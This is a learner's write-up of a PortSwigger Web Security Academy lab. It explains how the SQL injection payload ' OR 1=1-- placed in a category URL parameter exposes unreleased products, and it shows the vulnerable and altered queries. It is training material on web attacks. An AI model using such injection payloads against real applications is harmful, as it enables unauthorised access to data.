# Lab 1: SQL Injection - Retrieve Hidden Data
**Platform:** PortSwigger Web Security Academy  
**Level:** Apprentice  
**Category:** SQL Injection  
**Status:** ✅ Solved  

---

## Objective
The application uses a SQL query to display products by category. The goal was to retrieve hidden/unreleased products that are not shown to users.

---

## Vulnerability
The `category` parameter in the URL was not sanitized, allowing SQL injection directly into the WHERE clause.

**Vulnerable Query (backend):**
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

---

## Steps to Solve

1. Opened the web application and clicked on a product category (e.g., Gifts)
2. Noticed the URL contained: `?category=Gifts`
3. Injected the following payload into the category parameter:
```
' OR 1=1--
```
4. Final URL looked like:
```
?category=Gifts' OR 1=1--
```
5. The backend query became:
```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```
6. Since `1=1` is always true, ALL products including hidden ones were returned
7. Lab solved ✅

---

## Tool Used
- Browser (manual URL manipulation)
- Burp Suite (to intercept and modify request)

---
